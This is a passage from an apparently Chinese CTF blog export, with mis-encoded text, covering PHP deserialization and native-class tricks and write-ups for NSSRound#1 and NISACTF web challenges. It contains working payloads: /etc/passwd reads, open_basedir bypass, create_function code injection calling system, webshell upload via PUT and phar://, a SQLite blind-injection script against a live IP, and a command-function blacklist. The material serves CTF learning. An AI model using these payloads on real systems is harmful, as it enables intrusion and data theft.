12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#x27;shell.php&#x27;);class Game&#123; public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() &#123; $this-&gt;username=&#x27;user&#x27;; $this-&gt;password=&#x27;user&#x27;; &#125; public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123; $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; public function __destruct() &#123; $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); &#125;&#125;class login&#123; public $file; public $filename; public $content; public function __construct($file,$filename,$content) &#123; $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; &#125; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#x27;login success you can to open shell file!&#x27;); &#125; &#125;&#125;class register&#123; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; die(&#x27;success register admin&#x27;); &#125;else&#123; die(&#x27;please register admin &#x27;); &#125; &#125;&#125;class Open&#123; function open($filename, $content)&#123; if(!file_get_contents(&#x27;waf.txt&#x27;))&#123; shell($content); &#125;else&#123; echo file_get_contents($filename.&quot;.php&quot;); &#125; &#125;&#125;if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;]&amp;&amp;(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) &amp;&amp; (sha1($_GET[&#x27;a&#x27;])=== sha1($_GET[&#x27;b&#x27;])))&#123; @unserialize(base64_decode($_POST[&#x27;unser&#x27;]));&#125; æˆ‘ä»¬é‡ç‚¹å…³æ³¨åœ¨Openç±»ä¸Šï¼Œè¿™é‡Œæœ‰ä¸ªè¯»å–æ–‡ä»¶ï¼Œåªæœ‰è¯»å–waf.txtå¤±è´¥æ‰å¯ä»¥è¿›è¡Œrceã€‚è€Œè§‚å¯Ÿä»£ç ï¼Œæˆ‘ä»¬å‘ç°Gameç±»ä¸­çš„$contentå¯ä»¥è¿›è¡Œè®¾ç½®ï¼Œå› æ­¤æˆ‘ä»¬æ„é€ pocï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass Game&#123; public $username = &quot;admin&quot;; public $password = &quot;admin&quot;; public $choice; public $register = &quot;admin&quot;; public $file = new ZipArchive(); public $filename = &quot;waf.txt&quot;; public $content = ZipArchive::OVERWRITE; public function __construct() &#123; $this-&gt;username=&#x27;user&#x27;; $this-&gt;password=&#x27;user&#x27;; &#125; public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123; // admin $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; public function __destruct() &#123; $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); &#125;&#125;class login&#123; public $file; public $filename; public $content;&#125;class Open&#123; function open($filename, $content)&#123; &#125;&#125;$poc = new Game();echo base64_encode(serialize($poc)); å…¶ä»–å‚æ•°çš„è®¾ç½®æ˜¯åˆ«çš„è€ƒç‚¹ï¼Œæˆ‘ä»¬è¿™é‡Œåªå…³æ³¨åŸç”Ÿç±»ï¼Œè¿™æ ·å°±å¯ä»¥åˆ é™¤waf.txtæ–‡ä»¶äº†ã€‚ æ–‡ä»¶éå†DirectoryIterator/FilesystemIteratorè¿™ä¸¤ä¸ªç±»ååˆ†ç›¸ä¼¼ï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸ªå¾ˆç®€å•çš„pocå°±å¯ä»¥è¯»å–æ–‡ä»¶äº†ï¼š 123&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);echo $dir; ä¸è¿‡è¿™æ ·åªèƒ½è¯»å–æ ¹ç›®å½•ä¸‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡éå†è¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åï¼š 123456&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);foreach($dir as $f)&#123; echo($f.&#x27;&lt;br&gt;&#x27;); //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125; é…åˆglobåè®®è¿›è¡ŒåŒ¹é…åšåˆ°æŸ¥æ‰¾æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ï¼š 123&lt;?php$dir=new DirectoryIterator(&quot;glob:///*php*&quot;);echo $dir; GlobIteratorè¿™ä¸ªç±»nisaå¤ç°çš„æ—¶å€™ç”¨è¿‡ï¼Œå…¶å®ä¹Ÿå·®ä¸å¤šï¼Œä¸è¿‡æ¯”è¾ƒç‰¹æ®Šçš„æ˜¯ä»–è‡ªå·±å°±å¯ä»¥è¿›è¡ŒåŒ¹é…ï¼Œä¸éœ€è¦é€šè¿‡globä¼ªåè®®ï¼š 123&lt;?php$dir=new GlobIterator(&quot;/*php*&quot;);echo $dir; ç»•è¿‡open_basedirä¸globåè®®ç»“åˆè¯»å–é…åˆéå†å³å¯ç»•è¿‡ï¼Œæµ‹è¯•ä»£ç ä¹Ÿéå¸¸ç®€å•ï¼š 1234567&lt;?php$dir = $_GET[&#x27;whoami&#x27;];$a = new DirectoryIterator($dir);foreach($a as $f)&#123; echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// ä¸åŠ __toString()ä¹Ÿå¯,å› ä¸ºechoå¯ä»¥è‡ªåŠ¨è°ƒç”¨&#125;?&gt; payloadï¼š 1?whoami=glob:///* åŒæ ·ç”±äºGlobIteratorç±»çš„ç‰¹æ®Šæ€§ï¼Œä½¿ç”¨è¯¥ç±»éå†æ—¶å°±ä¸éœ€è¦é…åˆglobåè®®äº†ã€‚ SplFileObjectèƒ½éå†è‡ªç„¶è¦è¯»å–ï¼ŒSplFileInfoç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œã€‚nisaçš„é¢˜ç›®ä¸­è¿›è¡Œæ–‡ä»¶è¯»å–æ“ä½œç”¨çš„å°±æ˜¯è¿™ä¸ªç±»ã€‚ è¯»å–ç¬¬ä¸€è¡Œï¼š 123&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);echo $context; éå†æ–‡ä»¶ï¼š 12345&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);foreach($context as $f)&#123; echo($f);&#125; å’Œéå†æ–‡ä»¶çš„ç±»ç”¨æ³•ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„ã€‚ ReflectionMethodè¿™ä¸ªç±»æŠ¥å‘Šäº†ä¸€ä¸ªæ–¹æ³•çš„æœ‰å…³ä¿¡æ¯ï¼Œæœ€é‡è¦çš„æ˜¯å¯ä»¥å¯¼å‡ºæˆ–æå–å…³äºç±»ã€æ–¹æ³•ã€å±æ€§ã€å‚æ•°ç­‰çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Šï¼š 123456789101112131415161718ReflectionMethod::__construct â€” ReflectionMethod çš„æ„é€ å‡½æ•° ReflectionMethod::export â€” è¾“å‡ºä¸€ä¸ªå›è°ƒæ–¹æ³• ReflectionMethod::getClosure â€” è¿”å›ä¸€ä¸ªåŠ¨æ€å»ºç«‹çš„æ–¹æ³•è°ƒç”¨æ¥å£ï¼Œè¯‘è€…æ³¨ï¼šå¯ä»¥ä½¿ç”¨è¿™ä¸ªè¿”å›å€¼ç›´æ¥è°ƒç”¨éå…¬å¼€æ–¹æ³•ã€‚ ReflectionMethod::getDeclaringClass â€” è·å–è¢«åå°„çš„æ–¹æ³•æ‰€åœ¨ç±»çš„åå°„å®ä¾‹ ReflectionMethod::getModifiers â€” è·å–æ–¹æ³•çš„ä¿®é¥°ç¬¦ ReflectionMethod::getPrototype â€” è¿”å›æ–¹æ³•åŸå‹ (å¦‚æœå­˜åœ¨) ReflectionMethod::invoke â€” Invoke ReflectionMethod::invokeArgs â€” å¸¦å‚æ•°æ‰§è¡Œ ReflectionMethod::isAbstract â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯æŠ½è±¡æ–¹æ³• ReflectionMethod::isConstructor â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯æ„é€ æ–¹æ³• ReflectionMethod::isDestructor â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ææ„æ–¹æ³• ReflectionMethod::isFinal â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦å®šä¹‰ final ReflectionMethod::isPrivate â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ç§æœ‰æ–¹æ³• ReflectionMethod::isProtected â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯ä¿æŠ¤æ–¹æ³• (protected) ReflectionMethod::isPublic â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯å…¬å¼€æ–¹æ³• ReflectionMethod::isStatic â€” åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ˜¯é™æ€æ–¹æ³• ReflectionMethod::setAccessible â€” è®¾ç½®æ–¹æ³•æ˜¯å¦è®¿é—® ReflectionMethod::__toString â€” è¿”å›åå°„æ–¹æ³•å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨è¾¾ æˆ‘ä»¬ç”¨getDocComment()æ–¹æ³•ä¸¾ä¾‹ï¼Œè·å–æ³¨é‡Šå†…å®¹ï¼š 1234567891011121314&lt;?phperror_reporting(0);class Flag&#123; /** * mrl64&#123;flag_is_here&#125; */ function read()&#123; return 1234; &#125;&#125;$a = new ReflectionMethod(&#x27;Flag&#x27;,&#x27;read&#x27;);var_dump($a-&gt;getDocComment()); å‘ç°å›æ˜¾ï¼š 123string(39) &quot;/** * mrl64&#123;flag_is_here&#125; */&quot; æ€»ç»“æœ¬æ¥æ˜¯åªæƒ³ç€å­¦ä¸‹æ–‡ä»¶æ“ä½œç±»çš„éƒ¨åˆ†ï¼Œæ²¡æƒ³åˆ°å·²ç»å‡ºç°äº†è¿™ä¹ˆå¤šä¸åŒçš„è€ƒæ³•ï¼Œè¿˜æ˜¯å¾—å¤šåšæ€»ç»“ï¼Œåˆ©ç”¨åœ¨ä¹‹åçš„é¢˜ç›®ä¸­ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"ã€NSSRound#1 Basicã€‘èµ›åå¤ç°","slug":"ã€NSSRound-1-Basicã€‘èµ›åå¤ç°","date":"2022-04-03T05:30:05.000Z","updated":"2022-04-03T08:51:01.829Z","comments":true,"path":"2022/04/03/ã€NSSRound-1-Basicã€‘èµ›åå¤ç°/","link":"","permalink":"http://example.com/2022/04/03/%E3%80%90NSSRound-1-Basic%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/","excerpt":"å‰è¨€ ç¡è¿‡äº†å¿˜è®°äº†ï¼Œèµ·æ¥éƒ½å¿«ç»“æŸäº†ï¼Œå°±ç®€å•åšäº†ä¸‹å–è¯è¿˜æ²¡åšå®Œï¼ˆï¼Œèµ¶ç´§æ¥å¤ç°ä¸‹ã€‚","text":"å‰è¨€ ç¡è¿‡äº†å¿˜è®°äº†ï¼Œèµ·æ¥éƒ½å¿«ç»“æŸäº†ï¼Œå°±ç®€å•åšäº†ä¸‹å–è¯è¿˜æ²¡åšå®Œï¼ˆï¼Œèµ¶ç´§æ¥å¤ç°ä¸‹ã€‚ basic_checkè¿™é¢˜å‡ºçš„å¥½ï¼Œè€ƒå¯Ÿäº†httpåè®®çš„çŸ¥è¯†ï¼Œæˆ‘éƒ½å¿˜å…‰äº†éƒ½ï¼Œä¹Ÿæé†’è‡ªå·±åŸºç¡€ä¸€å®šè¦æ‰å®ã€‚ è¿›å…¥ç½‘é¡µçº¦ç­‰äºå•¥éƒ½æ²¡æœ‰ï¼š 1&lt;?php highlight_file(__FILE__);// Welcome to NSSCTF Round#1 Basic, have fun. è¿™é‡Œè¦ç”¨åˆ°OPTIONSè¯·æ±‚æ–¹æ³•æŸ¥çœ‹å…è®¸çš„è¯·æ±‚æ–¹å¼ï¼š å‘ç°PUTæ–¹æ³•ï¼Œé‚£ä¹ˆå°±ç®€å•äº†ï¼Œæˆ‘ä»¬åªéœ€è¦PUTè¿›ä¸€ä¸ªä¸€å¥é©¬å³å¯ï¼š è·å–webshellï¼š æ ¹ç›®å½•è¯»å–flagå³å¯ã€‚ sql_by_sqlè¿›å»å‘ç°æ³¨å†Œç™»å½•ï¼Œç›²çŒœäºŒæ¬¡æ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆéšä¾¿æ³¨å†Œç„¶åç™»å½•ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹å¯†ç ï¼Œæˆ‘ä»¬åœ¨ä¿®æ”¹å¯†ç çš„é¡µé¢çš„æºç ä¸­å‘ç°äº†sqlè¯­å¥ï¼š 1update user set password=&#x27;%s&#x27; where username=&#x27;%s&#x27;; ç¡®å®æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ³¨å†Œä¸€ä¸ªè´¦æˆ·åä¸ºadmin&#39;--+çš„ç”¨æˆ·ï¼Œç»“åˆsqlè¯­å¥å°±å¯ä»¥åšåˆ°æ”¹adminçš„å¯†ç ã€‚ å› æ­¤æ›´æ”¹adminå¯†ç ç™»å½•ï¼Œç™»é™†åå‘ç°å¯ä»¥æŸ¥è¯¢ç”¨æˆ·idï¼Œè¿™é‡Œæ ¹æ®ç”¨æˆ·æ˜¯å¦å­˜åœ¨å­˜åœ¨ä¸€ä¸ªå¸ƒå°”ç›²æ³¨ã€‚ æ ¹æ®fuzzåˆ¤æ–­è¿™é‡Œä¸æ˜¯mysqlï¼Œåº”è¯¥æ˜¯sqliteæ³¨å…¥ï¼Œexpï¼š 12345678910111213141516171819202122232425262728import requestsimport stringimport jsonstrs = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.,-&#123;&#125; &quot;url = &quot;http://1.14.71.254:28467/query&quot;s = requests.session()headers = &#123;&#x27;Cookie&#x27;: &#x27;session=eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.YklOVg.Pz554uNEiaxxBCpP4pm7-G8iucg&#x27;&#125;if __name__ == &quot;__main__&quot;: name = &#x27;&#x27; for i in range(0,100): char = &#x27;&#x27; for j in strs: #è¡¨+å­—æ®µ #payload = &quot;1 and substr((select sql from sqlite_master limit 1,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j) #æ•°æ® payload = &quot;1 and substr((select flag from flag limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j) data = &#123;&quot;id&quot;: payload&#125; r = s.post(url=url, data=data, headers=headers) #print(r.text) if &quot;exist&quot; in r.text: name += j print(j, end=&#x27;&#x27;) char = j break if char == &#x27;%&#x27;: break è¿™é¢˜ä¸»è¦æ˜¯åˆè¯†sqliteäº†ï¼Œä¸è¿‡å¤§ä½“ä¸Šå’Œmysqlä¹Ÿæ˜¯ç›¸å·®ä¸å¤§ï¼Œä¸»è¦æ˜¯ä¸€äº›å‡½æ•°çš„åŒºåˆ«å§ã€‚ cut_into_thirdså–è¯é¢˜ï¼Œå…¶å®éš¾åº¦ä¸é«˜ï¼Œä½†æ˜¯å› ä¸ºæˆ‘çš„å·¥å…·æ²¡æ³•è£…mimikatzæ’ä»¶å°±å¾ˆæ·¦ï¼Œåæ¥ç”¨äº†å¦ä¸€ä¸ªå·¥å…·æŠŠç¬¬ä¸‰éƒ¨åˆ†å¯†ç çˆ†å‡ºæ¥çš„ã€‚ æ•´ä½“æ€è·¯å°±æ˜¯filescanæ‰¾åˆ°LookAtMe.zipï¼Œè§£å‹å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†ï¼š 1part1:3930653363343839 æ¥ç€pslistæŸ¥è¿è¡Œç¨‹åºï¼Œå‘ç°LookAtme.exeï¼Œdumpä¸‹æ¥stringsæ‰¾åˆ°ç¬¬äºŒéƒ¨åˆ†ï¼š 1part2:GRRGGYJNGQ4GKMBNMJRTONI= æœ€åä¸€ä¸ªéƒ¨åˆ†è—åœ¨ctfç”¨æˆ·çš„å¯†ç ä¸­ï¼Œæ²¡æœ‰æ’ä»¶å°±ç”¨Passware Kit Forensicä¸€æŠŠå—¦ï¼Œæ‰¾åˆ°ç¬¬ä¸‰éƒ¨åˆ†ï¼š 1part3:MTEwOTFmNWI3ZTNh åˆ†åˆ«è§£ç base16ã€base32ã€base64å³å¯ã€‚","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ã€NISACTFã€‘write up","slug":"ã€NISACTFã€‘write-up","date":"2022-03-27T09:47:06.000Z","updated":"2022-03-30T15:21:34.654Z","comments":true,"path":"2022/03/27/ã€NISACTFã€‘write-up/","link":"","permalink":"http://example.com/2022/03/27/%E3%80%90NISACTF%E3%80%91write-up/","excerpt":"å‰è¨€ ç¦å¸ˆå¤§çš„æ ¡èµ›ï¼Œæœ‰äº›å¾ˆç®€å•çš„é¢˜å°±ä¸å†™äº†ï¼Œè¿™ä¸ªwpä¸»è¦æ˜¯è®°å½•ä¸‹å­¦ä¹ åˆ°çš„ä¸œè¥¿ï¼Œä¹Ÿä¸ç®—wpå…¶å®ï¼Œå› ä¸ºæœ‰äº›é¢˜æ˜¯åé¢å¤ç°çš„ã€‚","text":"å‰è¨€ ç¦å¸ˆå¤§çš„æ ¡èµ›ï¼Œæœ‰äº›å¾ˆç®€å•çš„é¢˜å°±ä¸å†™äº†ï¼Œè¿™ä¸ªwpä¸»è¦æ˜¯è®°å½•ä¸‹å­¦ä¹ åˆ°çš„ä¸œè¥¿ï¼Œä¹Ÿä¸ç®—wpå…¶å®ï¼Œå› ä¸ºæœ‰äº›é¢˜æ˜¯åé¢å¤ç°çš„ã€‚ webcheckin è¿™é¢˜çœ‹ä»£ç é¢œè‰²éƒ½èƒ½æ„Ÿè§‰åˆ°ä¸å¯¹ï¼Œä½¿ç”¨äº†ç‰¹æ®Šçš„ç¼–ç ï¼Œå› æ­¤è¦è¿›è¡ŒURLç¼–ç æ¥è¿›è¡ŒGETä¼ å‚ï¼Œpayloadï¼š 1?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6L3H%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6N1SACTF level-upäº”å±‚å…³å¡ï¼Œå‰å››å±‚éƒ½æ˜¯åšè¿‡çš„ï¼Œä¸»è¦å†™ä¸‹ç¬¬äº”å±‚ï¼Œæºç ï¼š 1234567891011121314&lt;?php//sorry , here is true last level//^_^error_reporting(0);include &quot;str.php&quot;;$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$a))&#123; show_source(__FILE__);&#125;else&#123; $a(&#x27;&#x27;,$b);&#125; è¿™é‡Œçš„è€ƒç‚¹æ˜¯åŒ¿åå‡½æ•°çš„ä½¿ç”¨ï¼Œä¸»è¦æ˜¯çœ‹åˆ°$a(&#39;&#39;,$b);è¿™ä¸ªä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨create_function()åŒ¿åå‡½æ•°ä»£ç æ³¨å…¥ï¼Œè¿™ä¸ªå‡½æ•°å¡«å…¥ä¸¤ä¸ªå‚æ•°ï¼Œå‰ä¸€ä¸ªæ˜¯å‡½æ•°åï¼Œåä¸€ä¸ªæ˜¯å‡½æ•°å†…å®¹ï¼Œå› æ­¤å¯ä»¥æ‰§è¡Œã€‚payloadï¼š 1?a=%5ccreate_function&amp;b=2;&#125;system(&#x27;cat /flag&#x27;);/* bingdundun~è¿™é¢˜çœ‹äº†wpæ‰å‘ç°å½“åˆå‡ ä¹éƒ½åšå‡ºæ¥äº†ï¼Œå°±å·®ä¸€ç‚¹ï¼Œæœ‰ç‚¹å¯æƒœã€‚ è¿›å…¥ç½‘é¡µå‘ç°å¯ä»¥ç‚¹å‡»uploadï¼Œç‚¹å‡»åæç¤ºå¯ä»¥ä¸Šä¼ å›¾ç‰‡æˆ–å‹ç¼©åŒ…ï¼Œå¹¶ä¸”å‘ç°urlæœ‰æ„æ€æ–‡ä»¶åŒ…å«ï¼š 1?bingdundun=upload ä¸Šä¼ æ–‡ä»¶æµ‹è¯•å‘ç°åº”è¯¥æ˜¯ç™½åå•ï¼Œå› æ­¤æ²¡åŠæ³•ä¸Šä¼ é…ç½®æ–‡ä»¶å’Œphpæ–‡ä»¶ï¼Œè€Œæ–‡ä»¶åŒ…å«ä¹Ÿè¿‡æ»¤äº†php://ã€data://ç­‰ä¼ªåè®®ï¼Œä½†æ˜¯å‘ç°phar://æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç»“åˆå¯ä»¥ä¸Šä¼ å‹ç¼©åŒ…ï¼Œè¿™é¢˜åº”è¯¥å°±æ˜¯è€ƒpharå‹ç¼©åŒ…ä¼ªåè®®çš„åŒ…å«äº†ã€‚ é‚£ä¹ˆæˆ‘ä»¬å†™ä¸€ä¸ªä¸€å¥é©¬å¹¶æ‰“åŒ…ä¸Šä¼ ï¼Œè·å–åˆ°æ–‡ä»¶åï¼Œç„¶åç”¨pharä¼ªåè®®æ„å»ºpayloadï¼š 1?bingdundun=phar://579eb57ccc73842341f80c475b04738b.zip/shell èšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•è·å–flagã€‚æˆ‘å½“æ—¶åŒ…å«çš„æ—¶å€™æœ€åå†™çš„æ˜¯shell.phpè€Œä¸æ˜¯shellå¯¼è‡´æ²¡åŒ…å«æˆåŠŸï¼Œæˆ‘å¥½æ°”å•Šã€‚ babyuploadè¿™é¢˜å½“æ—¶éƒ½æ²¡çœ‹ï¼Œèµ›åè¡¥ç¥¨äº†å±äºæ˜¯ã€‚ æºç æç¤º/sourceï¼Œé‚£å°±å»æŸ¥çœ‹ä¸‹ï¼Œå®¡è®¡pythonä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from flask import Flask, request, redirect, g, send_from_directoryimport sqlite3import osimport uuidapp = Flask(__name__)SCHEMA = &quot;&quot;&quot;CREATE TABLE files (id text primary key,path text);&quot;&quot;&quot;def db(): g_db = getattr(g, &#x27;_database&#x27;, None) if g_db is None: g_db = g._database = sqlite3.connect(&quot;database.db&quot;) return g_db@app.before_first_requestdef setup(): os.remove(&quot;database.db&quot;) cur = db().cursor() cur.executescript(SCHEMA)@app.route(&#x27;/&#x27;)def hello_world(): return &quot;&quot;&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; Select image to upload: &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;&lt;!-- /source --&gt;&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;@app.route(&#x27;/source&#x27;)def source(): return send_from_directory(directory=&quot;/var/www/html/&quot;, path=&quot;www.zip&quot;, as_attachment=True)@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])def upload(): if &#x27;file&#x27; not in request.files: return redirect(&#x27;/&#x27;) file = request.files[&#x27;file&#x27;] if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() file.save(&#x27;uploads/&#x27; + file.filename) return redirect(&#x27;/file/&#x27; + uid)@app.route(&#x27;/file/&lt;id&gt;&#x27;)def file(id): conn = db() cur = conn.cursor() cur.execute(&quot;select path from files where id=?&quot;, (id,)) res = cur.fetchone() if res is None: return &quot;File not found&quot;, 404 # print(res[0]) with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f: return f.read()if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) å‘ç°æ˜¯è·¯ç”±ï¼Œé‡ç‚¹æ£€æŸ¥/uploadå’Œfileï¼Œå¦‚æœæ–‡ä»¶åä¸­å«æœ‰.ï¼Œåˆ™è¿”å›Bad filename!ï¼Œç„¶åä¿å­˜æ–‡ä»¶å¹¶ä¸”è¿”å›ç»™/fileè·¯ç”±ã€‚è€Œfileè·¯ç”±ä¸­æœ‰ä¸€æ®µæ‰“å¼€æ–‡ä»¶è¯»å–çš„ä»£ç ï¼Œè¿™é‡Œå­˜åœ¨æ¼æ´ï¼Œæˆ‘ä»¬æ›´æ”¹æ–‡ä»¶åä¸º//flagï¼Œå‘åŒ…åå›æ˜¾æ–‡ä»¶åï¼Œè®¿é—®å¯¹åº”æ–‡ä»¶å³å¯è·å¾—flagï¼š middlerceå®¡è®¡ä»£ç ï¼š 1234567891011121314151617&lt;?phpinclude &quot;check.php&quot;;if (isset($_REQUEST[&#x27;letter&#x27;]))&#123; $txw4ever = $_REQUEST[&#x27;letter&#x27;]; if (preg_match(&#x27;/^.*([\\w]|\\^|\\*|\\(|\\~|\\`|\\?|\\/| |\\||\\&amp;|!|\\&lt;|\\&gt;|\\&#123;|\\x09|\\x0a|\\[).*$/m&#x27;,$txw4ever))&#123; die(&quot;å†åŠ æŠŠæ²¹å–”&quot;); &#125; else&#123; $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;]; checkdata($command); @eval($command); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; è¿‡æ»¤äº†ä¸€ç‰‡å­—ç¬¦ï¼Œè¿˜æœ‰äºŒæ¬¡checkï¼Œçœ‹ç€éƒ½éº»äº†ã€‚é¦–å…ˆæ˜¯æˆ‘ä»¬å¯è§çš„éƒ¨åˆ†ï¼Œè¿™éƒ¨åˆ†æ˜¯å‚è€ƒäº†ä¹‹å‰çš„ä¸€é“èµ›é¢˜ï¼Œä½†æ˜¯ç”±äº%0Aä¹Ÿæ²¡äº†ï¼Œæ‰€ä»¥å°±æ˜¯ç”¨PCREå›æº¯çš„æ–¹æ³•ç»•è¿‡preg_match()ã€‚ç„¶åè¿™é‡Œæœ‰ä¸ªå·¨å‘çš„ç‚¹ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´å‘é€å­—ç¬¦aä¸€ç›´ä¸è¡Œï¼Œåæ¥å‘ç°aä¹Ÿæ˜¯è¢«è¿‡æ»¤çš„çš„â€¦â€¦ ç„¶åæ˜¯ç¬¬äºŒå±‚ï¼Œæ‰“æ¯”èµ›çš„æ—¶å€™æ˜¯è¦çŒœçš„ï¼Œä¸è¿‡å¤ç°æ—¶å€™wpä¹Ÿç»™å‡ºäº†é»‘åå•ï¼š 1/\\^|\\||\\~|assert|print|include|require|\\(|echo|flag|data|php|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\\_|disk|tcp|cat|tac/i é˜²äº†å¾ˆå¤šæ–¹å¼ï¼Œä¸è¿‡*æ²¡è¢«è¿‡æ»¤æ‰€ä»¥å¯ä»¥æ„é€ æ¨¡ç³ŠæŸ¥è¯¢ï¼Œåå¼•å·æ²¡è¢«è¿‡æ»¤å¯ä»¥æ„é€ å‘½ä»¤æ‰§è¡Œã€‚echoè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡ç¬¦å·æ²¡è¢«è¿‡æ»¤ï¼Œå› æ­¤æ„é€ çŸ­æ ‡ç­¾è¿›è¡Œç»•è¿‡ï¼Œpayloadï¼š 123456import requestspayload = &#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `sort /f*`?&gt;&quot;,&quot;$&quot;:&quot;&#x27; + &quot;$&quot;*(1000000) + &#x27;&quot;&#125;&#x27;res = requests.post(&quot;http://1.14.71.254:28118/&quot;, data=&#123;&quot;letter&quot;:payload&#125;)print(res.text) å¾—åˆ°flagã€‚ hardsqlè¿™é¢˜æè¿°æœ‰ç›´æ¥ç»™è¯­å¥ï¼š 12$password=$_POST[&#x27;passwd&#x27;];$sql=&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;$password&#x27;;&quot;; å…¶å®çœ‹åˆ°è¿™ä¸ªè¯­å¥æˆ‘å°±æƒ³èµ·ä¹‹å‰hgameé‚£é¢˜çš„likeæ³¨å…¥ï¼Œæœ€ä¸»è¦åˆ—åç»™ä½ 